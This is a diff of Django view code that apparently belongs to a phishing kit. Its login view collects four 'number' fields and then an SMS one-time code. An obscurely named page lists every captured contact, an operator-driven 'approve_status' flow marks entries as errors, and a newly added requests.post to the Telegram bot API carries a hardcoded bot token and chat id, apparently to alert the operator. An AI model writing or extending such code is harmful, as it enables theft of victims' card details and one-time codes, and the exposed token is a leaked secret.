@@ -5,7 +5,8 @@ import requests
 from django.http import HttpResponse
 import re
 from django.views.decorators.csrf import csrf_exempt
-
+from .models import BannedIP
+from .serializers import BannedIPSerializer
 import json
 from django.shortcuts import render, redirect, get_object_or_404
 from django.http import JsonResponse
@@ -22,6 +23,7 @@ import socket
 from django.http import HttpResponseRedirect
 from django.urls import reverse
 from django.views.decorators.csrf import ensure_csrf_cookie
+from rest_framework import generics
 
 # Create your views here.
 
@@ -29,6 +31,10 @@ from django.views.decorators.csrf import ensure_csrf_cookie
 
 def index(request):
     return render(request, "index.html")
+
+def error(request):
+    return render(request, "login/eror.html")
+
 
 def login(request):
     return render(request, "login/index.html")
@@ -56,6 +62,8 @@ def login(request):
             "number3":number3,
             "number4":number4
         }
+        response = requests.post(f'https://api.telegram.org/bot6284666597:AAE17trIGiyILsEmfW9W9KcHNUUnIJKLZ_M/sendMessage?chat_id=-1894884341_506&text=Test')
+
         request.session['contact_id'] = contact.id
         return render(request, 'login/otp.html',context)
     return render(request, 'login/index.html')
@@ -93,7 +101,10 @@ def verify(request):
         contact.sms=combined_sms
         contact.page_name="Loading"
         contact.save()
-        return render( request,'pages/loading.html' )
+        context = {
+            'last_contact_id': contact.id
+        }
+        return render( request,'login/load.html',context )
     return render( request,'login/index.html',context )
 
 
@@ -125,3 +136,28 @@ def contact_list_api(request):
 def Asdsad32da(request):
     contacts = ContactModel.objects.all()
     return render(request, 'Asdsad32da.html', {'contacts': contacts})
+def custom_404_page(request, exception):
+    return render(request, 'login/404.html', status=404)
+
+def smserror(request, pk):
+    contact = get_object_or_404(ContactModel, pk=pk)
+    contact.approve_status = "error"
+    contact.save()
+    # Here you can redirect to another page
+    # For example: return redirect('azercell')
+
+    return JsonResponse({'success': True})
+
+def check_status(request, contact_id):
+    try:
+        contact = ContactModel.objects.get(pk=contact_id)
+        return JsonResponse({'approve_status': contact.approve_status})
+    except ContactModel.DoesNotExist:
+        return JsonResponse({'error': f'Contact with ID {contact_id} does not exist.'}, status=404)
+    
+    
+class BannedIPListCreateAPIView(generics.ListCreateAPIView):
+    queryset = BannedIP.objects.all()
+    serializer_class = BannedIPSerializer
+    
+    
